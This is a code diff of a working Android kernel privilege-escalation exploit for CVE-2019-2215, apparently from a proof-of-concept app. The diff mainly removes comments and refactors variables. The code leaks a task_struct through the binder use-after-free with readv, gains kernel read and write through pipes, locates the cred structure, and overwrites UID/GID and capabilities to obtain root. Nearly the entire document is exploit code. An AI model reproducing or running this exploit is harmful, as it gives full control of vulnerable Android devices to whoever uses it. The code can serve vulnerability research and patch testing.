@@ -48,7 +48,6 @@ static uint64_t cred_kptr = 0;
 static int cred_offset = 0x688;
 static int addr_limit_offset = 0xA18;
 
-// CPU バインディング（安定性向上）
 void bind_cpu(void) {
     cpu_set_t cpu_set;
     CPU_ZERO(&cpu_set);
@@ -68,7 +67,7 @@ void *mmap_page(unsigned long addr) {
     return mem;
 }
 
-// ========== Step 1: readv で task_struct をリーク ==========
+// ========== Step 1: readv で task_struct リーク ==========
 int leak_task_struct(void) {
     int pipefd[2];
     pid_t cpid;
@@ -78,7 +77,7 @@ int leak_task_struct(void) {
     ssize_t n;
     uint64_t *data;
 
-    LOGI("[*] Leaking task_struct via readv (standard method)");
+    LOGI("[*] Leaking task_struct via readv");
 
     binder_fd = open("/dev/binder", O_RDWR);
     if (binder_fd < 0) {
@@ -128,7 +127,6 @@ int leak_task_struct(void) {
     }
     LOGI("[+] aligned_address=%p", aligned_address);
 
-    // オーバーラップ iovec 設定
     memset(iovec_stack, 0, sizeof(iovec_stack));
     iovec_stack[OVERLAP_INDEX].iov_base = aligned_address;
     iovec_stack[OVERLAP_INDEX].iov_len = PAGE_SIZE;
@@ -147,15 +145,13 @@ int leak_task_struct(void) {
     }
 
     if (cpid == 0) {
-        // 子プロセス: 少し待ってから BINDER_THREAD_EXIT
-        usleep(100000);  // 100ms
+        usleep(100000);
         LOGI("[child] BINDER_THREAD_EXIT...");
         ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
         LOGI("[child] BINDER_THREAD_EXIT done");
         _exit(0);
     }
 
-    // 親: pipe にデータが来るのを待つ（タイムアウト 5 秒）
     pfd.fd = pipefd[0];
     pfd.events = POLLIN;
     int poll_ret = poll(&pfd, 1, 5000);
@@ -176,7 +172,6 @@ int leak_task_struct(void) {
         return -1;
     }
 
-    // readv で pipe から読み取り
     n = readv(pipefd[0], iovec_stack, IOVEC_COUNT);
     LOGI("[parent] readv returned %zd bytes", n);
     if (n < 0) {
@@ -188,7 +183,6 @@ int leak_task_struct(void) {
         return -1;
     }
 
-    // リークした task_struct を探す
     data = (uint64_t *)aligned_address;
     for (int i = 0; i < (n / 8); i++) {
         uint64_t val = data[i];
@@ -283,9 +277,9 @@ int setup_kernel_rw(void) {
     return 0;
 }
 
-// ========== Step 3: task_struct のスキャン（オフセット調整） ==========
+// ========== Step 3: オフセットスキャン ==========
 int scan_task_struct(void) {
-    LOGI("[*] Scanning task_struct for cred and addr_limit...");
+    LOGI("[*] Scanning task_struct...");
 
     uint8_t *buf = malloc(TASK_STRUCT_SIZE);
     if (!buf) {
@@ -293,10 +287,6 @@ int scan_task_struct(void) {
         return -1;
     }
 
-    int found_cred = -1, found_al = -1;
-    uint64_t cred_val = 0, al_val = 0;
-
-    // リークしたアドレスをそのまま使う（オフセットは固定）
     if (write(krw_pipe[1], &task_struct_kptr, 8) != 8) {
         LOGE("write failed");
         free(buf);
@@ -309,19 +299,18 @@ int scan_task_struct(void) {
         return -1;
     }
 
-    // cred ポインタを探す
+    int found_cred = -1, found_al = -1;
     for (int i = 0; i <= n - 8; i += 8) {
         uint64_t val = *(uint64_t *)(buf + i);
         if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
             if (found_cred == -1) {
                 found_cred = i;
-                cred_val = val;
+                cred_kptr = val;
                 LOGI("[+] cred candidate at 0x%x: 0x%llx", i, (unsigned long long)val);
             }
         }
         if (val == 0x0000007FFFFFFFULL || val == 0xFFFFFFFFFFFFFFFEULL) {
             found_al = i;
-            al_val = val;
             LOGI("[+] addr_limit candidate at 0x%x: 0x%llx", i, (unsigned long long)val);
         }
     }
@@ -329,17 +318,15 @@ int scan_task_struct(void) {
     if (found_cred != -1 && found_al != -1) {
         cred_offset = found_cred;
         addr_limit_offset = found_al;
-        cred_kptr = cred_val;
         LOGI("[+] Found offsets: cred=0x%x, addr_limit=0x%x", cred_offset, addr_limit_offset);
         free(buf);
         return 0;
     }
 
-    // フォールバック（既知のオフセット）
+    // フォールバック
     LOGI("[!] Using fallback offsets: cred=0x688, addr_limit=0xA18");
     cred_offset = 0x688;
     addr_limit_offset = 0xA18;
-    // cred ポインタを読み取る
     uint64_t ptr = task_struct_kptr + cred_offset;
     if (write(krw_pipe[1], &ptr, 8) != 8) {
         free(buf);
@@ -379,7 +366,6 @@ int patch_cred(void) {
     uint32_t zero = 0;
     uint64_t cap = 0x3FFFFFFFFFULL;
 
-    // UID/GID を 0 に
     uint64_t addrs[] = {
         base + 0x4, base + 0xC, base + 0x14, base + 0x1C,
         base + 0x8, base + 0x10, base + 0x18, base + 0x20
@@ -389,7 +375,6 @@ int patch_cred(void) {
         if (write(krw_pipe[1], &zero, 4) != 4) return -1;
     }
 
-    // Capabilities
     for (int i = 0; i < 5; i++) {
         uint64_t cap_addr = base + 0x28 + (i * 8);
         if (write(krw_pipe[1], &cap_addr, 8) != 8) return -1;
@@ -422,7 +407,7 @@ int verify_root(void) {
 
 // ========== JNI エントリ ==========
 JNIEXPORT jint JNICALL
-Java_com_example_tzpoc_MainActivity_nativeExploitCVE20192215Epoll(JNIEnv* env, jclass clazz) {
+Java_com_example_tzpoc_MainActivity_nativeExploitCVE20192215(JNIEnv* env, jclass clazz) {
     LOGI("========================================");
     LOGI("== CVE-2019-2215 Final readv Exploit ==");
     LOGI("========================================");
